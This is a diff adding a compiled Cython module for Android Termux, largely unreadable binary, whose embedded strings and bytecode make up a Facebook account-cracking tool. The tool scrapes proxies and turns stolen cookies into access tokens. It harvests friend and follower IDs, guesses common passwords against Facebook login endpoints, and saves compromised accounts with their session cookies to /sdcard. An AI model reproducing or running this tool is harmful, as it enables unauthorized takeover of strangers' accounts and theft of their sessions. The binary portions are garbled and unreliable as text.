@@ -1,0 +1,530 @@
+ELF�@p�@8 
+ @ @@@00<�<�<�<�<�TT�������������8�8�8���R�td�������pP�td���ttQ�tdppp���Androidr23c8568313Tew�������2IUhv�������)Rcz������#0?Nhy��������+AOan~������/��;��@��G ��7��c E��E�qX��|BE�������JJ6?>H,C<=&!"$9;A:0*- 
+ 2I D1'#.4F3E %+)5(7/8	@BG__cxa_atexit__cxa_finalize__register_atfork__bss_start_end_edataPyInit_multiPyModuleDef_InitPyThreadState_GetPyInterpreterState_GetIDPyExc_ImportErrorPyErr_SetStringPyObject_GetAttrStringPyModule_NewObject_Py_DeallocPyModule_GetDictPyDict_SetItemString_Py_NoneStructPyExc_AttributeErrorPyErr_ExceptionMatchesPyErr_ClearPyExc_RuntimeErrorPy_GetVersionPyOS_snprintfPyErr_WarnExPyTuple_NewPyBytes_FromStringAndSizePyUnicode_FromStringAndSizePyImport_AddModulePyObject_SetAttrStringPyUnicode_InternFromStringPyUnicode_DecodePyObject_Hash__pyx_module_is_main_multiPyObject_SetAttrPyImport_GetModuleDictPyDict_GetItemStringPyTuple_PackPyList_NewPyDict_NewPyImport_ImportModuleLevelObject_PyThreadState_UncheckedGet_PyObject_GetDictPtr_Py_FalseStruct_Py_TrueStructPyObject_NotPyErr_OccurredPyDict_SetItem_PyDict_GetItem_KnownHashPyObject_GetAttrPyUnicode_FromFormatPyUnicode_AsUTF8PyCode_NewEmptyPyFrame_NewPyTraceBack_HerePyMem_ReallocPyMem_Malloc__stack_chk_failPyExc_NameErrorPyErr_FormatPy_EnterRecursiveCallPy_LeaveRecursiveCallPyObject_CallPyExc_SystemErrorPyObject_DirPyDict_ContainsPyExc_TypeErrorPyEval_GetBuiltinsPyCode_TypePyUnicode_AsUTF8StringPyEval_MergeCompilerFlagsPyRun_StringFlagsPyEval_EvalCodelibc.soLIBC/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/liblibandroid-support.solibpython3.10.so.1.0������p������x������������X���8�8�@��`�@�h����0�������������h����(�T�0�<�@��X���`���������Լ���������'�(�6�; �>(�@��IH�P�X�`�h�p�x���	�� 
+ ������ �������������������������� � (�!0�"8�#@�$H�%P�&X�)`�*h�+p�,x�-��.��/��0��1��2��3��4��5��7��8��9��:��<��=��?��A�B�C�D 
+ parentexec: arg 1 must be string, bytes or code object, got %.200s while calling a Python objectnamemulti.pyinit multi%d.%d__file__submodule_search_locationsModule 'multi' has already been imported. Re-initialisation is not supported.__loader____package____path__code object passed to exec() may not contain free variablescython_runtimecompiletime version %s of module '%.100s' does not match runtime version %smultiInterpreter change detected - this module can only be loaded into one interpreter per process.NULL result without error in PyObject_Callmulti.cbuiltinsexec() arg 2 must be a dict, not %.200s%s (%s:%d)loaderoriginname '%U' is not defined__builtins__cline_in_traceback__import__loads__main__marshal__name__�@s�ddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl 
+ Z 
+ ddlZddlZddl mZddlmZddlmZddlmZddlmZddlmZddlmZdd	lm Z!dd 
+ l"m#Z$ddlmZ%ddlm&Z&ddl'm(Z)e&�*�e�Z+e�,d �e�,d�e�,d�gZ-gZ.gZ/e�0�Z1gZ2ze�3d�j4Z5e6dd��7e5�Wne8y�Z9z 
+ ed�WYdZ9[9ndZ9[9wwe6dd��:��;�Z5e<d�D]�Z=dZ>e�?dd�Z@e�?dd�ZAdZBe�?dd�Z9dZCe�?dd�ZDe�?dd�ZEe�?dd�ZFe�?dd�ZGdZHe>�e@�deA�d eB�e9�eC�eD�deE�deF�deG�d eH��ZIe-�JeI�d!ZKe�Lgd"��Z@d#ZAe�Lgd$��ZBe�?dd%�Z9e�Lgd$��ZCd&ZDe�?d'd�ZEd(ZFe�?d)d*�ZGe�?d+d,�ZHd-ZMeK�d e@�d.eA�eB�e9�eC�d/eD�eE�deF�deG�deH�d eM��ZNe.�JeN�q�e<d0�D]`ZOd1Z>e�?dd�Z@e�?dd�ZAe�Lgd$��ZBe�Lgd$��Z9e�Lgd$��ZCe�Lgd$��ZDe�?dd�ZEd2ZFe�?dd�ZGe�?dd�ZHd3ZMe>�e@�d4eA�eB�e9�eC�eD�eE�eF�eG�deH�d eM��ZP�q�d5d6�ZIggdddggggggggf \ ZQZRaSaTaUZVZWZXZYZZZ[Z\Z]gZ/ggZ^Z_d7Z`d7Zad8Zbd9Zcd:Zdd;Zed7Zfd<Zgd=Zhd<Zid>Zjd=Zkei�d?ea�d@ei�dA�Zlei�d?ea�d@ei�dB�ZmdCZgd9ZcdDZhdEZedFZkdGZddHZjdIZndJZfdKZodLZpdMZOd9ZqdNZHdDZEdOZrdPZsdQZtdHZ@dRZue�LeqeHeEese@g�ZvdSdTdUdVdWdXdYdZd[d\d]d^d_�ZwdSdTdUdVdWdXdYdZd[d\d]d`da�Zxej�y�jzZ{ewe|ej�y�j}�Z~ej�y�jZ�dbe|e{�dce|e~�dce|e��ddZ�dee|e{�dce|e~�dce|e��ddZ�dfdg�Z�dhdi�Z�djdk�Z�dldm�Z�dndo�Z�dpdq�Z�drds�Z�dtdu�Z�dvdw�Z�dxdy�Z�dzd{�Z�d|d}�Z�d~d�Z�d�d��Z�d�d��Z�d�d��Z�d�d��Z�d�d��Z�d�d��Z�d�d��Z�d�d��Z�d�d��Z�d�d��Z�e�d�k�rMze�,d��WnYze�,d��WnYe��dSdS)��N)�Table)�Console)� BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columns)�pretty)�Textzmkdir /sdcard/OKzmkdir /sdcard/CPzmkdir /sdcard/DUMPzwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txt�wu.[[[1;92m•[1;97m] [[1;96mAlvino_adijaya_xy�ri'z!Mozilla/5.0 (Symbian/3; Series60/��	ZNokia�di'zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/�zMobile Safari/535.1�.� zMozilla/5.0 (Linux; U; Android)�6�7�8�9�10�11�12z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zi�z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I�0ihi$�(�zMobile Safari/537.36z; z) � 
+ z"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzC; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/zMobile WVGA SMM-MMS/1.2.0 OPN-B�/cCs�ztdd�����}|D]}t�|�qWdSt�d�j}tdd�}t�	dt 
+ |��}|D]	}|�|d�q/tdd�����}YdS)Nz	bbnew.txtrz0https://github.com/EC-1709/a/blob/main/bbnew.txtz 
+ .bbnew.txtr zline">(.*?)<� 
+ )�open�read� 
+ splitlines�ugen�append�requests�get�text�re�findall�str�write)�uaZub�a�aaZun�rL��uaku[s� 
+ rNz[1;32mz[0;36mz[1;91mz[0;35mz[1;33mz[00mz[0;94mz[38;2;255;127;0;1m�[�•z]-->�]z[1;97mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;31mz[0mz[1;30mz[41m[1;97mz[mz[93mz[32mz[95mz[33mz[0;34mZJanuaryZFebruaryZMarchZAprilZMayZJuneZJulyZAugustZ	SeptemberZOctoberZNovemberZDecember)�1�2�3�4�5rrrrrrrZDevember)�01�02�03Z04Z05Z06Z07Z08Z09rrrzOK-�-z.txtzCP-cCs d}d}t�d�z	tdd���}Wn�ty�t�d�t�tt�dt��d�td�td	�tt�dt��d�t	� 
+ �jdd 
+ ���}td|||�tt�dt��d�tdd�}|� ||�|��td �tt�dt��d�t�d�d|d|d|}t�d�t�d|�Ynwt�d�j}||vr�t�dSt�d�t�tt�dt��d�td�td�tt�dt��d�td||�tt�dt��d�td �tt�dt��d�t�d�d|d|}t�d�t�d|�dS)Nz500==Z	N00B_B0SS�clearz1/data/data/com.termux/files/usr/bin/.termuxos.covr�_�>z 
+  YOUR ID NOT APPROVED u  
+  THIS YOUR ID COPY NOW👇     �z 
+  YOUR ID : r z! 
+ YOUR ID COPY AND SEND TO ADMIN g@z_Dear%20Admin,%20Please%20Approved%20My%20ID%20To%20Premium%20% 20% 20%20%20My%20%20ID%20%20:%20rM�4xdg-open https://www.facebook.com/mamunahmed.fahim.5z+am start https://wa.me/+8801715650048?text=zGhttps://raw.githubusercontent.com/unknown1565/zzz/main/Kkk/Fek/file.txtu 
+ THIS YOUR ID COPY NOW 👇umDear%20Admin,%20Please%20Apporved%20My%20ID_CODE%20To%20Premium✓✓%20%20%20%20%20My%20%20ID_CODE%20%20:%20)�os�systemr=r>�IOError�bannerr�IIr,�uuidZuuid4�hex�upperrH�close�time�sleeprBrCrD�login)�loveZnoob___mamun__Z___mamun__1ZmyidZkokZtksZr1rLrLrM�main_apv�sT 
+  
+  
+  
+  
+ �' 
+  
+  
+  
+ rmcCs2|dD]}tj�|�tj��t�d�qdS)Nr<g{�G�zt?)�sys�stdoutrH�flushrirj)�u�erLrLrM�	fahim_psb�s2rscCst�d�dS)Nr[)r`rarLrLrLrMr[�sr[cCs 
+ t�dS)N)rkrLrLrLrM�back�s 
+ rtcCs$t�t�d}tt|dd��dS)Nui  
+                                   ‘                      '                                                ‘                      '‚                                            '‚                       '                                                          '                   '                                           '                                '                        '‚                         ‘                                           
+     ‘                                              '                        ‘                             '‚                                               '‚                '                                                       '                       '                                                               '        '                        °                             ‘                                                        
+                  ‘                '                                                      ‘                                      '‚                                   °                    '                                                  '                             '                               '                                  '                           '‚                            ‘                                             
+               /¯¯¯\ '/¯¯¯¯\                         '                            /¯¯¯\ '/¯¯¯¯\  °                                    /¯¯¯¯\    °                               '                                                     '                   '                                                          '                 '        '‚                                                  ‘                                    
+    |\¯¯¯¯\/'/|    '|/'/|       '|             /¯¯¯¯/|‘                  |\¯¯¯¯\/'/|    '|/'/|       '|       /¯¯¯¯/|      '   '|\¯¯¯¯\/'/|       '|'‚  ____    ° |\¯¯¯¯\            ‘                                 '|\¯¯¯¯\   '‚              /¯¯¯¯/|‘                                             /¯¯¯¯/|‘ '|\¯¯¯¯\   '‚                             '‚                      '/¯¯¯¯'\‘    /¯¯¯¯/|'‚                     
+    |;|       /;/     '/;/       /|           '/       /;'|‘                  |;|       /;/     '/;/       /|     '/____/|¯¯¯¯|°  '|;'|       '/'/       /|‘ |\____\ '   |;'\       \ |¯¯¯¯'|'‚              '/¯¯¯¯/|¯¯¯¯| '|;'\       \  /¯¯¯¯\ ‘  /       /\¯¯¯¯\ '   /¯¯¯¯/|' '|\¯¯¯¯\ '          '/       /;'|‘ '|;'\       \  /¯¯¯¯\ ‘        /¯¯¯¯/;/¯¯¯¯'/|   |\¯¯¯¯\/ /|       '|   '|       |;|¯¯¯¯'|              
+    |/      '/;/___/;/       /;'|  /¯¯¯¯\|       |;;/                   |/      '/;/___/;/       /;'|  |¯¯¯¯|\\'/       '/|    '/       /'/       /;'|‘ /¯¯¯¯¯/| ‘ '\;'|       |/____/|'‚              |       |;|____|  \;'|       '|/'/|       |  '|       '|;;\       \  '|       |;|  |;|       |  /¯¯¯¯\|       |;;/   \;'|       '|/'/|       |       '/       /;/       '/;'|   |;|       '/;/____/|   |\____\|       '|'‚             
+   '/      '/;;|     '|/       /;;'/'‚'|       '|\        \/                   '/      '/;;|     '|/       /;;'/'‚ |      '| |        /;;|‘  /       /'/       /;;'/ '|        '|;|     \/       /|¯¯¯¯|                |       |; ____'   \/        '/;/      /|'‚ '|\       \;;|       |‘ |\       \/¯\/       /|‘'|       '|\        \/     \/        '/;/      /|'‚     '/      '/;/       '/;;/‘   \/       /|;|       |;|‘  |;|      /       '/|°             
+  /      '/;;/'|__,'/       /;;/   '|\       \|        '|'‚                 /      '/;;/'|__,'/       /;;/    |       \|       '|;;'/ '/       /'/       /;;'/'  '|\        \| '‚  '/       /'/       /|‘               |       |;|       |  /         /;/      /;'|'‚ '|;'\____\/      '/|' |;|        /\        |;| '|\       \|        '|'‚   /         /;/      /;'|'‚    /       '|/        /;;/    '/       /;'|\|____|/'   '\|___'|       '|;|°             
+ '|____|;/       |____|;'/‘    '|;'\____/|___,/|                 '|____|;/       |____|;'/‘     |\____/\____\/'  |____|;|____|;;/    '|;\_____\'‚ /____/'/____/;'| ‘              |____|/____/|‘'|_____|;'|____|;/‘   \;'|      /____/;|' \/____/;|;'\____\| '|;'\____/|___,/|   '|_____|;'|____|;/‘    '|_____/|____|;'/  '‚  |____|;'/‘                      |\____\/'‚             
+ '|       |/        |       |/ '‚     \;'|      |;|     |;| '‚               '|       |/        |       |/ '‚     |;|      |;|       '|   |       |/|       |/       \;|         |‘'|       |/|       |;;/                |       ||       |‘|''|        '|;/|       |/'     '\|___|       '|;/   |       |;'|;;|       '|'‚ \;'|      |;|     |;| '‚ '|        '|;/|       |/'     '|        |;|       |/‘      |       |/    '‚                   |;|       |‘              
+ '|____|         |____|      '‚  '\|___,|/|___|/   '              '|____|         |____|      '‚ '\|___,|/|____'|   |____| |____|         \|_____| '|____| |____|/                  |____||____|/ '|_____|  |____| '‚           '|____'|/    |____|/  \|____'|'   '\|___,|/|___|/   ''|_____|  |____| '‚    '|____,|/|____|‘       |____|            '‚            '\|____|               
+              
+ CODED BY : MD MANIK CHOWDHURY �green�Zstyle)r[�sol�cetak�nel)ZbanrLrLrMrc�srccCs�zgtdd���}tdd���}t�|�z&tjdtdd|id�}t�|j�d}t�|j�d	}t	||�WWdSt 
+ yHt�YWdStjj ygd 
+ }t|dd�}t�j|d d�t�YWdSwtytt�YdSw)N� 
+ .token.txtr�.cok.txtz:https://graph.facebook.com/me?fields=id,name&access_token=r�cookie��cookies�name�idz2# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN�redrvZpurple)r=r>�tokenkurArBrC�json�loadsrD�menu�KeyError� login_lagi334� 
+ exceptions�ConnectionError�markrwr�exitrb)�token�cokZsyZsy2Zsy3ZliZlorLrLrMrks( 
+ ��rkcCs2zmt�d�t�t�ttttt	g�}t 
+ dt�dt�dt�d|�d�        �}tj ddd        d 
+ ddd dddd�	d|id�}t�d|j�}tdd��|�d��}tdd��|�}tdt�dt�dt�dt�d�	�t�d�t�WdSty�}zt�d�t�d�tdtttttf�t�WYd}~dSd}~ww)Nr[z rOrPz] ENTER COOKIE :rz0https://business.facebook.com/business_locationsz�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.comrR�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0z�text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8ztext/html; charset=utf-8)	� 
+ user-agent�refererZhost�origin�upgrade-insecure-requests�accept-language� cache-control�accept�content-typer|)�headersr~z	(EAAG\w+)rzr rr{rQz LOGIN SUCCESSFUL...RUN AGAIN zrm -f .token.txtzrm -f .cok.txtz$ %s[%sx%s]%s TRY ANOTHER COOKIE !%s)r`rarc�random�choice�m�k�h�brq�inputr,rBrCrE�searchrDr=rH�grouprrirjr��	Exception�x)�asur|�dataZ 
+ find_tokenZkenr�rrrLrLrMr�s$ 
+ "(, 
+  
+ ��r�cCs�ztdd���}tdd���}Wnty%td�t�d�t�Ynwt�d�t	�t 
+ �d�j}tt �d�d        �td 
+ |�d��td|�d ��td|�d��td�tt �d�d	�tt�dt �dt�d��tt�dt �dt�d��tt�dt �dt�d��tt�dt �dt�d��tt �d�d	�tt�d��}|dvr�t�dS|dvr�t�dS|dvr�t�dS|dvr�t�d�t�d �tt�d!��t�dStt�d"��t�dS)#Nrzrr{u[×] COOKIE INVALID �r[zhttps://api.ipify.orgr\r]z,[47m[31m ASSALAMU ALAIKUM : z [00m[00mz.[46m [37mYOUR FACEBOOK UID : z [00m[00mz&[41m[32m IP ADDRESS : z" [00m[00mzM[42m[31m AUTO CONNECT RANDOM PROXY [00mrOrRz] CRACKING PUBLIC IDrSz] CRACKING FOLLOWER IDrTz] CRACKING FILEr7z] REMOVE COOKIE� CHOICE AN OPTION : �rRrW�rSrX�rTrY)r7Z00zrm -rf .token.txtzrm -rf .cookie.txtz COOKIE REMOVE SUCCESSFUL � INCORRECT OPTION )r=r>rbrrirjr�r`rarcrBrCrDrdrsr,r��wa�dump_massal� dump_follower� 
+ crack_filer�rt)Zmy_nameZmy_idr�r�ZipZ_____fuck_you_____rLrLrMr�.sH 
+  
+ � 
+  
+  
+  
+  
+  
+  
+  
+ r�cCs*tt�t�dt���t�d�t�dS)Nz* Sorry, this feature is still being fixed r)rr�r�rqrirjrtrLrLrLrM�errorXs 
+  
+ r�c 
+ Cs\ztdd���}tdd���}Wntyt�Ynwzttt�d���}Wnty=tt	�t�d��t�Ynw|dksF|dkrPtt�d��t�t 
+ ��}d        }t|�D]}|d7}tt�d 
+ �t |�d�}t�|�qZtD]\}z9|jd|d td	d|id���}|ddD]}	z|	dd|	d} 
+ | 
+ tvr�nt�| 
+ �Wq�Yq�Wquttfy�Yqut 
+ jjy�tt�t�d��t�Yquwz tt�d�d�tt�t�dt	��t tt���t�WdSt 
+ jj�ytt��tt�d��t�YdSttf�y-tt�t�dt���t�d�t�YdSw)Nrzrr{z HOW MUCH TARGET ID : r�rrz LIMIT OVER rz TARGET UIDz : z https://graph.facebook.com/v2.0/z)?fields=friends.limit(5000)&access_token=r~r}Zfriendsr�r��|r� INTERNET CONNECTION ERRORr\r]� TOTAL ID : z CONNECTION ERROR z INVALID ID �)r=r>rbr��intr�r�� 
+ ValueErrorrr-rB�Session�rangerG�uidrArCr�r�r�r�r�r�r�rd�len�settingrqrtrirj)r�r�Zjum�sesZyzZmetZklZuserr�col�miZisorLrLrMr�^sf 
+ � 
+ �& 
+  
+ � 
+ � 
+ �" 
+  
+ �r�c	CsFztdd���}tdd���}Wntyt�Ynwtt�t�d��tt�d��}zHtj	d|dt 
+ dd        |id 
+ ���}|ddD]}zt� |d d|d�WqGYqGtt�t�dt�d�ttt���t�WdStjjy�tt�t�d��t�YdSttfy�tt�d��t�YdSw)Nrzrr{z TYPE ME AND CRACK OWN FOLLOWER z ENTER TARGET UID : zhttps://graph.facebook.com/z.?fields=subscribers.limit(99999)&access_token=rr|r}Zsubscribersr�r�r�rr�rr�z INVALID TARGET ID )r=r>rbr�rr�rdr�rBrCr�r�r�rAr�rGr�r�r�r�r-r�)r�r�ZpilZkoh2ZpirLrLrMr��s, 
+ �&  
+ $�r�c 
+ CsXzt�d�}Wntytt�d��t�d�t�Ynwt|�dkr7tt�d��t�d�t�dSd}i}|D]�}zt	d|d�� 
+ �}WnYq=|d7}|d        kr�d 
+ t|�}|�t|�t|�i�|�|t|�i�tt �d�d�tt�d t�dt�d�||t|�f�tt �d�d�q=|�t|�t|�i�tdt|�d|dtt|��dt�tt�dt�dt�d�||t|�f�q=tt�d��}z||}Wnty�tt�t�dt���t�d�t�Ynwz t	d|d�����}Wntt�d��t�d�t�Y|D]}	t�|	��qt�dS)Nz/sdcard/DUMPz FILE NOT FOUND �rz You Don't Have Dump Filesz /sdcard/DUMP/rrrrMr\r]z	 %s. %s (z %sz idz )rO�] z [ z 
+ Account ]z%s. %s (z %s zidz) r�z FILE NOT FOUNDr�z% FILE NOT FOUND CHECK YOUR FILE PATH )r`�listdir�FileNotFoundErrorrr�rirjrtr�r=�	readlinesrG�updaterdr�rqr�r�r�r>r?r�rAr�)
+ZvinZcihZlolZisiZhemZnomZgeehZgehZlinZxidrLrLrMr��sR 
+  
+ � 
+  
+  
+ (0* 
+  
+ � 
+  
+ r�cCs�tt�d�d�tt�dt�dt�dt�dt�dt�dt�dt�dt�d	��tt�d�d�tt�d 
+ ��}|dvrItt�D]}t�|�q@nO|dvrvg}tt�D]}|�|�qSt	|�}|d }t 
+ |�D] }t�||�|d 8}qgn"|dvr�tD]}t�dt        t��}t� ||�q|n 
+ tt�d��t�tt�d�d�td�tt�dt�dt�dt�dt�dt�dt�dt�dt�dt�dt�dt�dt�dt�dt�d��tt�d�d�tt�d 
+ ��}|dvr�t�d�n|dvr�t�d�nt�d�tt�d��}        tt�dt�d��} 
+ | 
+ dv�r<t�d�tt�dt�d��tt�d��}|�d �}|D]} t�| ��q2nt�d!�t�t�dS)"Nr\r]rOrRz] CRACK OLD ID 
+ rSz] CRACK NEW ID 
+ rTz] CRACK MIX IDr�r�r�rr�rr�zQ[1;47m[31m LOGIN METHOD [1;00mz	] MOBILE ZPROz] 
+ z	] MBASIC z] MBASIC V1�mobile�mbasicz+ CRACK AND SHOW ACCOUNT LINKED APP ( Y/N ) rzCHOICE PASSWORD METHOD ( m/d ) ��yr4�yaz$TYPE ANY SIX DIGIT OR MORE PASSWORD z ENTER PASSWORD : �,�no)rrdr,r�r��sortedr��id2rAr�r�r�Zrandint�insertr��method�pwpluss�split�pwnya�passwrd)�huZtuaZmudaZbacotZbcmZbcmiZxmudZxxZhcZ_jembot_ZpwplusZpwkuZpwkuhZxpwrLrLrMr��s`>� 
+ ��b 
+  
+  
+  
+ � 
+  
+ r�c Cs�tt�d�d�tt�dt�dt�dt�dt��	t�tt�dt�dt�dt�d	t��	t�tt�d 
+ ��tt�d�d�t        dd���}t 
+ D]�}|�d �d|�d �d��}}|�d�d}g}t |�dkr�t |�dkrrn<|�|d�|�|d�|�|d�n&t |�dkr�|�|�n|�|�|�|d�|�|d�|�|d�dtvr�tD]}|�|�q�n	dtvr�|�t||�qIdtvr�|�t||�qIdtvr�|�t||�qIdtvr�|�t||�qI|�t||�qIWd�n	1�swYtd�ttd��tdt�dt�dt�d t�d!�	t�tt�dt�dt�dt�d"t�d#t�d�t�td�td$�tt�d%��}|d&v�rTt�dStt�t�d'��t�d(�t�dS))Nr\r]z CRACK �OKz ACCOUNT SAVED: zOK/%s ZCPz ACCOUNT SAVED : zCP/%s z, TRUN ON FLIGHT MODE AFTER 500 IDZ CRACKING �)Zmax_workersr�rrr�r�Z1234Z12345Z123456r�r�ZfreeZtouchr�rMz- CRACKING SUCCESSFUL rOrPrQz OK : z%s z CP : z%sz!CRACK AGAIN ANOTHER ID ( Y/t ) ? r�r�z THANKS FOR USING MY TOOLS r�) rrdr�r�rqr��okcr��cpc�tredr�r��lowerr�rAr�r�r��submit�crack�	crackfree� 
+ cracktouch�crackmbasicrxry�ok�cpr�rtrirjr�)ZpoolZyuzong�idfZnmfZfrs�pwvZxpwdZwoirLrLrMr�sd((" 
+ ���$&0 
+  
+  
+  
+ r�c"Cst�ttttttg�}tj	� 
+ dt�dt�d|�t �t�dt�tt��t�dt�dt�t�t�dt�dt�t�t�d|�d�t ttt����t�d��ftj	��t�t�}t�t�}t��}|D�]}�zt�t�}d	d 
+ |i}|j�dd|d dddddddddd� �|�d|d�}        t�dt |        j!���"d�t�dt |        j!���"d�|dd|d�} 
+ d�#d d!�|        j$�%��&�D��}|d"7}dd#dd$d%|d dddddd&ddd'�}|j'd(| 
+ d)|i|d*|d+�} d,| j$�%��(�v�rt)dt*�d-|�d.|�t+���t,d/t-d0�� 
+ |d.|d1�t.�/|d.|�td7aWncd2|j$�%��(�v�rgtd7a| j$�%�}d�#d3d!�|j$�%��&�D��}t)dt�d4|�d5|�d6|�t+��	�t,d7t0d0�� 
+ |d.|d.|d1�t1t2|�WnWqbtj3j4�yyt5�6d8�Yqbwt d7a dS)9N� zN00B B0SS-->rOr;�]—�]—[�{:.0%}�] �httpz	socks4://zm.facebook.comrR��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�cors�empty�documentzhttps://m.facebook.com/�gzip, deflate br�en-GB,en-US;q=0.9,en;q=0.8) �Hostr�r�r�Zdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-destr��accept-encodingr��8https://p.facebook.com/login/device-based/password/?uid=�)&flow=login_no_pin&refsrc=deprecated&_rdr�name="lsd" value="(.*?)"r�name="jazoest" value="(.*?)"�)https://p.facebook.com/login/save-device/�login_no_pin�Zlsd�jazoestr��nextZflow�pass�;cS�g|] 
+ \}}d||f�qS�z%s=%srL��.0�key�valuerLrLrM� 
+ <listcomp>X�zcrack.<locals>.<listcomp>� m_pixel_ratio=2.625; wd=412x756r�zhttps://m.facebook.com�!application/x-www-form-urlencodedzlhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F�r�r�r�r�r�r�r�r�r�r�r�r�r�r�r��Chttps://p.facebook.com/login/device-based/validate-password/?shbl=0r|F�r�r~r��allow_redirectsZproxies� 
+ checkpointz 
+ B0SS-CP : r�z/sdcard//sdcard/CP/rJr<�c_usercSrrrLrrLrLrMrfrz 
+ B0SS-OK : z | PASSWORD : z 
+  
+ COOKIE : �/sdcard/OK/�)7r�r�r�r�r�r�rqr�rnrorHrdr+�loopr�r�r#r�r��format�floatrpr@�ugen2rBr��proxr�r�rCrEr�rGrDr��joinr~�get_dict�items�post�keysrr-r)r=r��akunrAr��cek_apk�sessionr�r�rirj)r�r�ZborI�ua2r��pw�nip�proxs�p�dataa�koki�heade�po�coki�kukirLrLrMr�HsH� 
+  
+  
+  
+  
+ (:$  
+ $( 
+ �r�c Cs4tj�d�gd�t��d�t��d�t��d�t��d�t��t��t��d�|��tt	���t��d�t��d�t 
+ ��t��t��d�t��d�t��t ��t��d�t��d	�tttt	�����t��d 
+ ���ftj��t�t�}t�t�}t��}|D�]}z�|j�ddd dddddd��|jd|d|i|	dtd�}t�dt|j ���!d�t�dt|j ���!d�|dd|d�}d�dd �|j"�#��$�D��}|d!7}ddd d"d#d$d%d&d'd(d)d*d+d,dd-�}	|j%d|d|i|	dtd�} 
+ d.| 
+ j"�#��&�v�r/t't(d/��t)d0t*�d1|�d2|�t+���t,d3t-d4��|d2|d5�t.�/|d2|�t d7a Wned6|j"�#��&�v�r�td7a| 
+ j"�#�}d�d7d �|j"�#��$�D��}t't(d8��t)d0t 
+ �d1|�d2|�d2|�t+��	�t,d9t0d4��|d2|d5�t1t2|�WnWq�tj3j4�y�t5�6d:�Yq�wtd7adS);NrMz ? rOZMbasicrQr;r�r�r�r��p.facebook.comr�rR�lMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8z@https://p.facebook.com/login/save-device/?refsrc=deprecated&_rdr� gzip, deflater��r�r�r�r�r�r�r�r�rr|Frr�rr�r�r�rrcSrrrLrrLrLrMr�rzcrackfree.<locals>.<listcomp>r zhttps://p.facebook.comrz�Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36r�r�r�r�r�r�zlhttps://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fr�rrz [red] CHECKPOINTr�z>> r��/sdcard/CP/rJr<rcSrrrLrrLrLrMr�rz [purple] N00B B0SS [purple]rr)7rnrorHrr+r�r�rr�r�r#r�r�r�r�r�rrrpr�r�r@rrBr�r�r�rCr'rEr�rGrDr�r~rrrr rxryrr&r)r=r�r!rAr�r"r#r�r�rirj) r�r�r(rIr$r�r%r)r*r+r,r-r.rLrLrMr�ssF� 
+  
+  
+  
+ :$  
+ $  
+ �r�c Cs�t�ttttttg�}tdt	t 
+ �}d}t�t�}dd|i}t�t�}t�t �}t��}        tj�d|tt        t 
+ �ttt|�t|�tf�tj��|D�]} 
+ �z�|        j�dddd        d 
+ ddd d��|        �d|d�}t�dt|j���d�t�dt|j���d�|dd| 
+ d�}|	j�ddddd|ddddddd |d!d"d#d$��|	j d%|d&| it!d'|d(�}d)�"d*d+�|j#�$��%�D��} | d,7} d-|j#�$��&�v�rd.t'vr�t(�)|d/| 
+ �t*|| 
+ �n?d.t+v�rt,d0�d1|�d2| 
+ ��}t-|d3d4�}t.t-|d5d6��t/d7t0d8��|d/| 
+ d0�t(�)|d/| 
+ �td7anWqKW�n9d9|	j#�$��&�v�rCd:d;i}d<t1v�r~|j#�$�}d)�"d=d+�|	j#�$��%�D��}t/d>t2d8��|d/| 
+ d/|d0�t,d0�d1|�d?| 
+ �d@|��}t-|dAd4�}t.t-|dBd6��td7aWn�d.t1v�rB|j#�$�}d)�"dCd+�|	j#�$��%�D��}t/dDt2d8��|d/| 
+ d/|d0�|}dE}t��}|jdF||dG�j}|jdH||dG�j}|dI7}t�3dJt|��}d}|D]}|dK|�dL|dM�dN|d�dO�7}|d7}�q�dM}|dP7}t�3dJt|��}dM}|D]}|d7}|dQ|�dL|dM�dN|d�dR�7}�qt,d0�dS|�d?| 
